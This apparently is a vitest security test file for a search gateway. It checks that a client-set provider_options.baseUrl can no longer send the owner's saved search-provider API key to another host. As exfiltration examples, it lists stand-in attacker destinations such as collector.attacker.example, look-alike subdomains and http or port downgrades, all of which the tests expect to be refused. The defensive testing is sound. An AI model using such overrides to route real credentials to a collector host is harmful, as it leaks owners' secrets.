import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

// F28 — API-key exfiltration through client-controlled provider_options.baseUrl.
//
// Threat: any caller of POST /v1/search (any gateway API key, or a loopback
// request with no key at all) can set `provider_options.baseUrl` to a host it
// controls. The handler resolves the saved owner credential for the selected
// provider (serper/tavily/exa/…) and attaches it as X-API-Key / Authorization
// to THAT host. Layer-1 SSRF checks (`assertPublicUrl`) do not help: the
// attacker's own public domain passes them.
//
// Fix under test (option (a)): a client-supplied baseUrl may only *shadow* the
// destination the attached credential belongs to — the provider's configured
// registry baseUrl or the owner-configured custom node
// (`credentials.providerSpecificData.baseUrl`). Any other origin is refused, and
// no credential is ever attached to an arbitrary host.

// node:dns is stubbed so the network path (fetchPublic → assertPublicUrlResolved)
// never performs real lookups.
const { lookupMock } = vi.hoisted(() => ({ lookupMock: vi.fn() }));
vi.mock("node:dns", () => ({
  default: { promises: { lookup: lookupMock } },
  promises: { lookup: lookupMock },
}));

const { resolveBaseUrl, buildSearchRequest, assertCredentialDestination } = await import(
  "../../open-sse/handlers/search/callers.js"
);
const { handleSearchCore } = await import("../../open-sse/handlers/search/index.js");

const OWNER_KEY = "SEC-OWNER-SERPER-KEY-9f3c2b";
const SERPER = {
  id: "serper",
  baseUrl: "https://google.serper.dev",
  method: "POST",
  authType: "apikey",
  searchTypes: ["web", "news"],
  defaultMaxResults: 5,
  maxMaxResults: 100,
};
// SearXNG is the BYO-instance provider: `authType: "none"`, never carries a key.
const SEARXNG = {
  id: "searxng",
  baseUrl: "http://localhost:8888/search",
  method: "GET",
  authType: "none",
  searchTypes: ["web", "news"],
  defaultMaxResults: 5,
  maxMaxResults: 50,
};

/** Stub fetch and record every outbound call (URL + header bag). */
function captureFetch() {
  const calls = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url, init) => {
      const headers = {};
      new Headers(init?.headers || {}).forEach((value, key) => {
        headers[key] = value;
      });
      calls.push({ url: String(url), headers, body: init?.body });
      return new Response(JSON.stringify({ organic: [], results: [] }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    })
  );
  return calls;
}

function searchCoreArgs({ providerConfig, credentials, providerOptions, body }) {
  return {
    body: { query: "release notes", ...(body || {}), provider_options: providerOptions },
    provider: { id: providerConfig.id },
    providerConfig,
    credentials,
  };
}

beforeEach(() => {
  lookupMock.mockReset();
  // Default: every hostname resolves to a public address (no rebinding).
  lookupMock.mockResolvedValue([{ address: "203.0.113.10", family: 4 }]);
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("F28: saved provider key must never be sent to a client-chosen host", () => {
  it("RED PROOF — refuses a credential-bearing override to an external attacker host", async () => {
    const calls = captureFetch();

    const result = await handleSearchCore(
      searchCoreArgs({
        providerConfig: SERPER,
        credentials: { apiKey: OWNER_KEY },
        providerOptions: { baseUrl: "https://collector.attacker.example" },
      })
    );

    // Before the fix this call went out with `X-API-Key: <owner key>`.
    expect(calls).toHaveLength(0);
    expect(JSON.stringify(calls)).not.toContain(OWNER_KEY);
    expect(result.success).toBe(false);
    expect(result.status).toBe(400);
  });

  it("keeps the legitimate path working (no override → key still reaches the provider)", async () => {
    const calls = captureFetch();

    const result = await handleSearchCore(
      searchCoreArgs({ providerConfig: SERPER, credentials: { apiKey: OWNER_KEY }, providerOptions: undefined })
    );

    expect(result.success).toBe(true);
    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe("https://google.serper.dev/search");
    expect(calls[0].headers["x-api-key"]).toBe(OWNER_KEY);
  });

  it("blocks look-alike sub/super-domains of the provider host", async () => {
    const calls = captureFetch();

    for (const baseUrl of [
      "https://google.serper.dev.attacker.example",
      "https://attacker-google.serper.dev",
      "https://serper.dev.attacker.example",
    ]) {
      const result = await handleSearchCore(
        searchCoreArgs({
          providerConfig: SERPER,
          credentials: { apiKey: OWNER_KEY },
          providerOptions: { baseUrl },
        })
      );
      expect(result.success, `should block ${baseUrl}`).toBe(false);
    }

    expect(calls).toHaveLength(0);
    expect(JSON.stringify(calls)).not.toContain(OWNER_KEY);
  });

  it("blocks a same-host downgrade to plain http / another port", async () => {
    const calls = captureFetch();

    for (const baseUrl of ["http://google.serper.dev", "https://google.serper.dev:8443"]) {
      const result = await handleSearchCore(
        searchCoreArgs({
          providerConfig: SERPER,
          credentials: { apiKey: OWNER_KEY },
          providerOptions: { baseUrl },
        })
      );
      expect(result.success, `should block ${baseUrl}`).toBe(false);
    }

    expect(calls).toHaveLength(0);
  });

  it("allows shadowing path/prefix on the provider's own origin", async () => {
    const calls = captureFetch();

    const result = await handleSearchCore(
      searchCoreArgs({
        providerConfig: SERPER,
        credentials: { apiKey: OWNER_KEY },
        providerOptions: { baseUrl: "https://google.serper.dev/enterprise-mirror" },
      })
    );

    expect(result.success).toBe(true);
    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe("https://google.serper.dev/enterprise-mirror/search");
    expect(calls[0].headers["x-api-key"]).toBe(OWNER_KEY);
  });

  it("treats the owner-configured custom node as part of the allowlist", async () => {
    const calls = captureFetch();

    const mirror = "https://serper-mirror.corp.example";
    const ok = await handleSearchCore(
      searchCoreArgs({
        providerConfig: SERPER,
        credentials: { apiKey: OWNER_KEY, providerSpecificData: { baseUrl: mirror } },
        providerOptions: { baseUrl: `${mirror}/tenant-a` },
      })
    );
    expect(ok.success).toBe(true);
    expect(calls.map((c) => c.url)).toEqual(["https://serper-mirror.corp.example/tenant-a/search"]);

    const blocked = await handleSearchCore(
      searchCoreArgs({
        providerConfig: SERPER,
        credentials: { apiKey: OWNER_KEY, providerSpecificData: { baseUrl: mirror } },
        providerOptions: { baseUrl: "https://collector.attacker.example" },
      })
    );
    expect(blocked.success).toBe(false);
    expect(calls).toHaveLength(1); // nothing new went out
  });

  it("still allows a keyless BYO endpoint override (searxng keeps working)", async () => {
    const calls = captureFetch();

    const result = await handleSearchCore(
      searchCoreArgs({
        providerConfig: SEARXNG,
        credentials: null,
        providerOptions: { baseUrl: "https://my-searxng.example.org" },
      })
    );

    expect(result.success).toBe(true);
    expect(calls).toHaveLength(1);
    expect(calls[0].url.startsWith("https://my-searxng.example.org/search?")).toBe(true);
    // No auth material whatsoever on the keyless path.
    expect(calls[0].headers.authorization).toBeUndefined();
    expect(calls[0].headers["x-api-key"]).toBeUndefined();
  });

  it("ignores a body-level provider_specific_data (only credentials may supply it)", async () => {
    const calls = captureFetch();

    const result = await handleSearchCore(
      searchCoreArgs({
        providerConfig: SERPER,
        credentials: { apiKey: OWNER_KEY },
        providerOptions: undefined,
        body: { provider_specific_data: { baseUrl: "https://collector.attacker.example" } },
      })
    );

    expect(result.success).toBe(true);
    expect(calls.map((c) => c.url)).toEqual(["https://google.serper.dev/search"]);
  });

  it("covers every credential-bearing builder, not just serper", () => {
    const withKey = [
      ["brave-search", "https://api.search.brave.com/res/v1"],
      ["perplexity", "https://api.perplexity.ai/chat/completions"],
      ["exa", "https://api.exa.ai/search"],
      ["tavily", "https://api.tavily.com/search"],
      ["google-pse", "https://www.googleapis.com/customsearch/v1"],
      ["linkup", "https://api.linkup.so/v1/search"],
      ["searchapi", "https://searchapi.io/api/v1/search"],
      ["youcom", "https://ydc-index.io/v1/search"],
      ["xquik", "https://xquik.com/api/v1/x/tweets/search"],
      ["ollama-search", "https://ollama.com/api/web_search"],
      ["glm", "https://api.z.ai/api/mcp/web_search_prime/mcp"],
    ];

    for (const [id, defaultBaseUrl] of withKey) {
      const config = { id, baseUrl: defaultBaseUrl, authType: "apikey" };
      // google-pse additionally requires a `cx` search-engine id before it builds.
      const extras = id === "google-pse" ? { cx: "TEST_ENGINE_CX" } : {};
      const params = {
        query: "q",
        searchType: "web",
        maxResults: 5,
        token: OWNER_KEY,
        providerOptions: { ...extras, baseUrl: "https://collector.attacker.example" },
      };
      expect(() => buildSearchRequest(config, params), `${id} must refuse external baseUrl`).toThrow();
      // and the untouched default still builds
      const built = buildSearchRequest(config, { ...params, providerOptions: extras });
      expect(built.url.startsWith(defaultBaseUrl.replace(/\/+$/, "")), `${id} default url`).toBe(true);
      const serialized = `${built.url} ${JSON.stringify(built.init.headers || {})}`;
      expect(serialized).toContain(OWNER_KEY); // credential still attached, to the right host
    }
  });
});

describe("F28: resolveBaseUrl unit contract", () => {
  it("rejects a credential-bearing override outside the destination origin", () => {
    const params = {
      token: OWNER_KEY,
      providerOptions: { baseUrl: "https://collector.attacker.example" },
    };
    expect(() => resolveBaseUrl(SERPER, params)).toThrow(/baseUrl/i);
  });

  it("accepts a credential-bearing override on the same origin", () => {
    const params = {
      token: OWNER_KEY,
      providerOptions: { baseUrl: "https://google.serper.dev/mirror" },
    };
    expect(resolveBaseUrl(SERPER, params)).toBe("https://google.serper.dev/mirror");
  });

  it("accepts a keyless override (nothing to exfiltrate)", () => {
    const params = { providerOptions: { baseUrl: "https://my-searxng.example.com" } };
    expect(resolveBaseUrl(SERPER, params)).toBe("https://my-searxng.example.com");
  });

  it("treats any non-empty token as a credential, even a non-string one", () => {
    // Whatever reaches the header bag gets serialized onto the wire, so a token
    // that is not a string must not be mistaken for "no credential attached".
    for (const token of [123456, { k: "v" }, "  spaced-key  "]) {
      const params = { token, providerOptions: { baseUrl: "https://collector.attacker.example" } };
      expect(() => resolveBaseUrl(SERPER, params), `token ${JSON.stringify(token)}`).toThrow(/baseUrl/i);
    }
    expect(() =>
      resolveBaseUrl(SERPER, { token: "", providerOptions: { baseUrl: "https://my-searxng.example.com" } })
    ).not.toThrow();
    expect(() =>
      assertCredentialDestination(SERPER, { token: 123456 }, "https://collector.attacker.example/search")
    ).toThrow(/credential/i);
  });
});

describe("F28: network-boundary credential binding (defense in depth)", () => {
  it("refuses a credential-bearing URL that no builder produced from a trusted base", () => {
    const params = { token: OWNER_KEY };
    expect(() =>
      assertCredentialDestination(SERPER, params, "https://collector.attacker.example/search")
    ).toThrow(/credential/i);
    // owner custom node is a trusted destination too
    expect(() =>
      assertCredentialDestination(
        SERPER,
        { token: OWNER_KEY, providerSpecificData: { baseUrl: "https://serper-mirror.corp.example" } },
        "https://serper-mirror.corp.example/search"
      )
    ).not.toThrow();
    expect(() =>
      assertCredentialDestination(SERPER, params, "https://google.serper.dev/search")
    ).not.toThrow();
    // keyless → nothing to bind
    expect(() =>
      assertCredentialDestination(SEARXNG, {}, "https://my-searxng.example.org/search")
    ).not.toThrow();
  });

  it("closes the generic unknown-provider fallback path too", async () => {
    const calls = captureFetch();
    const CUSTOM = {
      id: "some-future-provider",
      baseUrl: "https://api.wellknown-saas.example/v1/search",
      method: "POST",
      authType: "apikey",
    };

    const result = await handleSearchCore(
      searchCoreArgs({
        providerConfig: CUSTOM,
        credentials: { apiKey: OWNER_KEY },
        providerOptions: { baseUrl: "https://collector.attacker.example" },
      })
    );

    expect(result.success).toBe(false);
    expect(result.status).toBe(400);
    expect(calls).toHaveLength(0);

    // and its own default endpoint still works
    const ok = await handleSearchCore(
      searchCoreArgs({ providerConfig: CUSTOM, credentials: { apiKey: OWNER_KEY }, providerOptions: undefined })
    );
    expect(ok.success).toBe(true);
    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe("https://api.wellknown-saas.example/v1/search");
    expect(calls[0].headers.authorization).toBe(`Bearer ${OWNER_KEY}`);
  });
});
